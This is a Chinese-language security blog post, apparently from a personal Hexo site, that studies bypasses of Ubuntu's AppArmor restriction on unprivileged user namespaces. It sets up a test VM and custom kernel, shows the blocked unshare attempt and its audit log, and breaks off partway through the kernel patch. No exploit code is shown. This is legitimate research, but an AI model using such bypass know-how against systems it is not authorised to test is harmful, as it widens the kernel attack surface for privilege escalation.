@@ -1,0 +1,753 @@
+
+  <!DOCTYPE html>
+  <html lang="en"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"copy success(*^▽^*)","fail":"copy failed (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"Naup"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    Analyze AppArmor and Ubuntu’s Unprivileged Namespace Restriction bypass |
+    
+    堇姬 Naup&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="Analyze AppArmor and Ubuntu’s Unprivileged Namespace Restriction bypass Author : 堇姬 Naup  前言最近剛好遇到 AppArmor 相關的東東，突然想到 pumpkin 寫過的這篇https:&#x2F;&#x2F;u1f383.github.io&#x2F;linux&#x2F;2025&#x2F;06&#x2F;26&#x2F;the-journey-of-bypassing-u">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Analyze AppArmor and Ubuntu’s Unprivileged Namespace Restriction bypass">
+<meta property="og:url" content="http://example.com/2025/11/21/Ubuntu-Unprivileged-user-namespace-and-apparmor/index.html">
+<meta property="og:site_name" content="堇姬 Naup&#39;s Blog">
+<meta property="og:description" content="Analyze AppArmor and Ubuntu’s Unprivileged Namespace Restriction bypass Author : 堇姬 Naup  前言最近剛好遇到 AppArmor 相關的東東，突然想到 pumpkin 寫過的這篇https:&#x2F;&#x2F;u1f383.github.io&#x2F;linux&#x2F;2025&#x2F;06&#x2F;26&#x2F;the-journey-of-bypassing-u">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2025/11/21/Ubuntu-Unprivileged-user-namespace-and-apparmor/upload_0df7db8977d47a32a4ee87b1da972141.png">
+<meta property="og:image" content="http://example.com/2025/11/21/Ubuntu-Unprivileged-user-namespace-and-apparmor/upload_a1b7c19a159dde8f64aa01ccc5921a7b.png">
+<meta property="article:published_time" content="2025-11-21T08:56:24.000Z">
+<meta property="article:modified_time" content="2025-11-21T09:04:02.686Z">
+<meta property="article:author" content="Naup堇姬">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/11/21/Ubuntu-Unprivileged-user-namespace-and-apparmor/upload_0df7db8977d47a32a4ee87b1da972141.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="堇姬 Naup's Blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/fav.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">Naup...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">Home</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">Archives</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">About</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="https://i.postimg.cc/bJwcgqPx/131939316-p0.jpg" alt="Analyze AppArmor and Ubuntu’s Unprivileged Namespace Restriction bypass">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">Analyze AppArmor and Ubuntu’s Unprivileged Namespace Restriction bypass</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Analyze-AppArmor-and-Ubuntu%E2%80%99s-Unprivileged-Namespace-Restriction-bypass"><span class="toc-number">1.</span> <span class="toc-text">Analyze AppArmor and Ubuntu’s Unprivileged Namespace Restriction bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unprivileged-User-Namespace"><span class="toc-number">1.2.</span> <span class="toc-text">Unprivileged User Namespace</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AppArmor"><span class="toc-number">1.3.</span> <span class="toc-text">AppArmor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#build-env"><span class="toc-number">1.4.</span> <span class="toc-text">build env</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analyze"><span class="toc-number">1.5.</span> <span class="toc-text">Analyze</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exploit"><span class="toc-number">1.6.</span> <span class="toc-text">exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#demo"><span class="toc-number">1.7.</span> <span class="toc-text">demo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">1.8.</span> <span class="toc-text">After all</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Naup堇姬" class="lazyload">
+  <div class="sidebar-author-name">Naup堇姬</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">85</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">21</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-email sidebar-social-icon">
+      <a href=naup96721@gmail.com itemprop="url" target="_blank" aria-label="email" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/Naupjjin itemprop="url" target="_blank" aria-label="github" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-Ubuntu-Unprivileged-user-namespace-and-apparmor" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/11/21/Ubuntu-Unprivileged-user-namespace-and-apparmor/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-11-21T08:56:24.000Z" itemprop="datePublished">2025-11-21</time>
+    <time style="display: none;" id="post-update-time">2025-11-21</time>
+  </a>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="Analyze-AppArmor-and-Ubuntu’s-Unprivileged-Namespace-Restriction-bypass"><a href="#Analyze-AppArmor-and-Ubuntu’s-Unprivileged-Namespace-Restriction-bypass" class="headerlink" title="Analyze AppArmor and Ubuntu’s Unprivileged Namespace Restriction bypass"></a>Analyze AppArmor and Ubuntu’s Unprivileged Namespace Restriction bypass</h1><blockquote>
+<p>Author : 堇姬 Naup</p>
+</blockquote>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近剛好遇到 AppArmor 相關的東東，突然想到 pumpkin 寫過的這篇<br><a target="_blank" rel="noopener" href="https://u1f383.github.io/linux/2025/06/26/the-journey-of-bypassing-ubuntus-unprivileged-namespace-restriction.html">https://u1f383.github.io/linux/2025/06/26/the-journey-of-bypassing-ubuntus-unprivileged-namespace-restriction.html</a>  </p>
+<p>以及 Qualys 的這篇<br><a target="_blank" rel="noopener" href="https://blog.qualys.com/vulnerabilities-threat-research/2025/03/27/qualys-tru-discovers-three-bypasses-of-ubuntu-unprivileged-user-namespace-restrictions">https://blog.qualys.com/vulnerabilities-threat-research/2025/03/27/qualys-tru-discovers-three-bypasses-of-ubuntu-unprivileged-user-namespace-restrictions</a>  </p>
+<p>所以順便研究及復現了一下，稍微紀錄  </p>
+<h2 id="Unprivileged-User-Namespace"><a href="#Unprivileged-User-Namespace" class="headerlink" title="Unprivileged User Namespace"></a>Unprivileged User Namespace</h2><p>該機制主要用於在一個 Unprivileged user 下，可以在一個受限的環境裡拿到管理權限，該權限實質上在 host 上仍是 Unprivileged  </p>
+<p>當可以建立 Unprivileged User Namespace，可以使使用者能摸到更多 kernel 的組件，也增加了攻擊面  </p>
+<h2 id="AppArmor"><a href="#AppArmor" class="headerlink" title="AppArmor"></a>AppArmor</h2><p>通常我們會通過 <code>chmod</code> 來去針對檔案設定，甚麼 user 甚麼 group 可不可以讀取寫入等權限<br>而 AppArmor 則是直接限制一個程式可以做甚麼，例如可以讀甚麼檔案<br>更詳細來說，其允許系統管理員透過定義應用程式應被授予哪些資源的存取權限，並拒絕所有其他資源的存取權限來實現最小權限原則<br>一個程式沒有設定，則以無限制的 Unconfined 設定檔來執行  </p>
+<p>AppArmor 實作限制了建立 Unprivileged User Namespace 或是其他的建立，因此使得攻擊面變小<br>這幾篇主要是要說明，如何繞過 AppArmor 來建立 Unprivileged User Namespace  </p>
+<p>接下來來詳細介紹 AppArmor 用法<br>先安裝  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -y  python3-apparmor=3.0.4-2ubuntu2</span><br><span class="line">sudo apt install -y  apparmor-utils=3.0.4-2ubuntu2</span><br></pre></td></tr></table></figure>
+
+<p>先準備一個 file</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/etc/passwd&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error to open /etc/passwd\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>位於</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">naup96321@naup96321-virtual-machine:~/Desktop/apparmor-test$ pwd</span><br><span class="line">/home/naup96321/Desktop/apparmor-test</span><br><span class="line">naup96321@naup96321-virtual-machine:~/Desktop/apparmor-test$ tree</span><br><span class="line">.</span><br><span class="line">├── apparmortest</span><br><span class="line">└── apparmortest.c</span><br></pre></td></tr></table></figure>
+
+<p>接下來要寫 config<br>可以先通過 <code>aa-easyprof &lt;binary path&gt; &gt; /etc/apparmor.d/home.naup96321.Desktop.apparmor-test.apparmortest</code><br>產生基礎設定檔<br>這邊我們添加禁止訪問 &#x2F;etc&#x2F;passwd  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.apparmortest</span><br><span class="line"><span class="meta"># vim:syntax=apparmor</span></span><br><span class="line"># AppArmor policy <span class="keyword">for</span> apparmortest</span><br><span class="line"># ###AUTHOR###</span><br><span class="line"># ###COPYRIGHT###</span><br><span class="line"># ###COMMENT###</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tunables/global&gt;</span></span></span><br><span class="line"></span><br><span class="line"># No template variables specified</span><br><span class="line"></span><br><span class="line">/home/naup96321/Desktop/apparmor-test/apparmortest &#123;</span><br><span class="line">    <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;abstractions/base&gt;</span></span></span><br><span class="line">    deny /etc/passwd r,</span><br><span class="line">    /home/naup96321/Desktop/apparmor-test/apparmortest mr,</span><br><span class="line"></span><br><span class="line">    /home/naup96321/Desktop/apparmor-test<span class="comment">/** rw,</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    capability,</span></span><br><span class="line"><span class="comment">    file,</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>輸入這個生效</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apparmor_parser -r /etc/apparmor.d/home.naup96321.Desktop.apparmor-test.apparmortest</span><br><span class="line">sudo aa-enforce /etc/apparmor.d/home.naup96321.Desktop.apparmor-test.apparmortest</span><br></pre></td></tr></table></figure>
+
+<p>執行後就會發現不能開啟了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">naup96321@naup96321-virtual-machine:~/Desktop/apparmor-test$ ./apparmortest </span><br><span class="line">error to open /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>通過 <code>aa-status</code> 查看狀態<br>可以發現其已經在 enforce mode 了<br>enforce node : 違反 rules 會阻擋及記錄<br>complain mode : 違反 rules 會記錄  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">naup96321@naup96321-virtual-machine:~/Desktop/apparmor-test$ sudo aa-status</span><br><span class="line">apparmor module is loaded.</span><br><span class="line">62 profiles are loaded.</span><br><span class="line">60 profiles are in enforce mode.</span><br><span class="line">   /home/naup96321/Desktop/apparmor-test/apparmortest</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>順帶一提 <code>aa-disable</code> 可以關閉</p>
+<p>對 AppArmor 有初步了解後，先來架設環境</p>
+<h2 id="build-env"><a href="#build-env" class="headerlink" title="build env"></a>build env</h2><p>先來裝一台 24.04 ubuntu<br><a target="_blank" rel="noopener" href="https://releases.ubuntu.com/24.04/">https://releases.ubuntu.com/24.04/</a><br>開一個 VMware 匯入  </p>
+<p>裝好後進去可以看到，預設的 kernel version 應該是 6.14.0-35-generic  </p>
+<p>接下來我們要替換到 vm 上的 kernel 成我們自己編譯的<br>Ubuntu 是基於原生的 linux kernel 來 patch 的<br><a target="_blank" rel="noopener" href="https://launchpad.net/ubuntu/+source/linux/6.11.0-18.18">https://launchpad.net/ubuntu/+source/linux/6.11.0-18.18</a>  </p>
+<p>在這網站有兩個檔案<br>一個是原來的 kernel，一個是 diff<br>這份 diff <code>6.11.0-18.18</code> 前面的 <code>6.11.0</code> 是 kernel version，<code>18.18</code> 是 ubuntu 自己維護的版本  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://launchpad.net/ubuntu/+archive/primary/+sourcefiles/linux/6.11.0-18.18/linux_6.11.0.orig.tar.gz</span><br><span class="line">wget https://launchpad.net/ubuntu/+archive/primary/+sourcefiles/linux/6.11.0-18.18/linux_6.11.0-18.18.diff.gz</span><br><span class="line"></span><br><span class="line">tar -xzf linux_6.11.0.orig.tar.gz</span><br><span class="line">gunzip linux_6.11.0-18.18.diff.gz</span><br></pre></td></tr></table></figure>
+
+<p>接下來拿 diff patch 後，我拿 host 上的 config 編譯</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd linux-6.11.0</span><br><span class="line">patch -p1 &lt; ../linux_6.11.0-18.18.diff</span><br><span class="line"></span><br><span class="line">sudo apt install build-essential libncurses-dev flex bison libssl-dev libelf-dev bc</span><br><span class="line">cp /boot/config-$(uname -r) .config</span><br><span class="line">make olddefconfig</span><br><span class="line">make -j8</span><br></pre></td></tr></table></figure>
+
+<p>之後要將機器上的 kernel 替換，不過當 install 完後，要進入到 grub 將 kernel 替換，不過我一直抓不到 grub 時間，所以去修改 <code>/etc/default/grub</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo make -j8 modules_install</span><br><span class="line">sudo make -j8 install</span><br><span class="line">sudo update-grub</span><br><span class="line">sudo nano /etc/default/grub (edit hidden to menu, timeout 10s)</span><br><span class="line">sudo update-grub</span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure>
+
+<p>進到 grub 後，Ubuntu 高級選項 -&gt; 選擇對應 kernel version</p>
+<img src="/2025/11/21/Ubuntu-Unprivileged-user-namespace-and-apparmor/upload_0df7db8977d47a32a4ee87b1da972141.png" class="">
+
+<p>進去後就可以看到 kernel 版本已經被替換了</p>
+<img src="/2025/11/21/Ubuntu-Unprivileged-user-namespace-and-apparmor/upload_a1b7c19a159dde8f64aa01ccc5921a7b.png" class="">
+
+<h2 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h2><p>Ubuntu 實作了一套基於 AppArmor 的東西，來讓一般使用者不能創建 unprivileged user namespace ，這個東西可以讓你在某個 namespace 中擁有 root，不過在全局上仍屬於一般使用者，但是通過 unprivileged user namespace ，可以摸到更多 kernel 的組件，以增加攻擊面<br>舉個例子，若在 host 上使用這個功能  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">naup@naup-VMware-Virtual-Platform:~/Desktop/apparmor-test$ ip <span class="built_in">link</span> <span class="built_in">set</span> lo up</span><br><span class="line">RTNETLINK answers: Operation not permitted</span><br></pre></td></tr></table></figure>
+
+<p>會直接被 reject 掉<br>但如果設定一個 user namespace 中建立 network namespace，則可以正常執行  </p>
+<p>這篇主要是要講如何 bypass AppArmor 來重新可以建立 unprivileged user namespace</p>
+<p>首先先嘗試在 VM 上建立 unprivileged user namespace</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">naup@naup-VMware-Virtual-Platform:~/Desktop/apparmor-test$ unshare -r -n -m /bin/bash</span><br><span class="line">unshare: write failed /proc/self/uid_map: Operation not permitted</span><br><span class="line">naup@naup-VMware-Virtual-Platform:~/Desktop/apparmor-test$ sudo dmesg</span><br><span class="line">[  741.972257] audit: <span class="built_in">type</span>=1400 audit(1763633042.017:158): apparmor=<span class="string">&quot;AUDIT&quot;</span> operation=<span class="string">&quot;userns_create&quot;</span> class=<span class="string">&quot;namespace&quot;</span> info=<span class="string">&quot;Userns create - transitioning profile&quot;</span> profile=<span class="string">&quot;unconfined&quot;</span> pid=3980 <span class="built_in">comm</span>=<span class="string">&quot;unshare&quot;</span> requested=<span class="string">&quot;userns_create&quot;</span> target=<span class="string">&quot;unprivileged_userns&quot;</span></span><br><span class="line">[  741.981461] audit: <span class="built_in">type</span>=1400 audit(1763633042.027:159): apparmor=<span class="string">&quot;DENIED&quot;</span> operation=<span class="string">&quot;capable&quot;</span> class=<span class="string">&quot;cap&quot;</span> profile=<span class="string">&quot;unprivileged_userns&quot;</span> pid=3980 <span class="built_in">comm</span>=<span class="string">&quot;unshare&quot;</span> capability=21  capname=<span class="string">&quot;sys_admin&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以在看到被 reject 了，通過 dmesg 可以看到<br>第一條當啟動想要創建 namespace 時，他轉換 profile 成 <code>unprivileged_userns</code><br>在轉換完成 profile 後，在新的受限制環境中，進程嘗試獲取 sys_admin 系統管理員權限，但被 AppArmor 拒絕  </p>
+<p>可以來看看 patch  </p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+struct aa_label *aa_profile_ns_perm(struct aa_profile *profile,</span></span><br><span class="line"><span class="addition">+				    struct apparmor_audit_data *ad,</span></span><br><span class="line"><span class="addition">+				    u32 request)</span></span><br><span class="line"><span class="addition">+&#123;</span></span><br><span class="line"><span class="addition">+	struct aa_ruleset *rules = list_first_entry(&amp;profile-&gt;rules,</span></span><br><span class="line"><span class="addition">+						    typeof(*rules), list);</span></span><br><span class="line"><span class="addition">+	struct aa_label *new;</span></span><br><span class="line"> 	struct aa_perms perms = &#123; &#125;;</span><br><span class="line"><span class="deletion">-	int error = 0;</span></span><br><span class="line"><span class="addition">+	aa_state_t state;</span></span><br><span class="line"> </span><br><span class="line"> 	ad-&gt;subj_label = &amp;profile-&gt;label;</span><br><span class="line"> 	ad-&gt;request = request;</span><br><span class="line"><span class="addition">+	int error;</span></span><br><span class="line"> </span><br><span class="line"><span class="deletion">-	if (!profile_unconfined(profile)) &#123;</span></span><br><span class="line"><span class="deletion">-		struct aa_ruleset *rules = list_first_entry(&amp;profile-&gt;rules,</span></span><br><span class="line"><span class="deletion">-							    typeof(*rules),</span></span><br><span class="line"><span class="deletion">-							    list);</span></span><br><span class="line"><span class="deletion">-		aa_state_t state;</span></span><br><span class="line"><span class="deletion">-</span></span><br><span class="line"><span class="deletion">-		state = RULE_MEDIATES(rules, 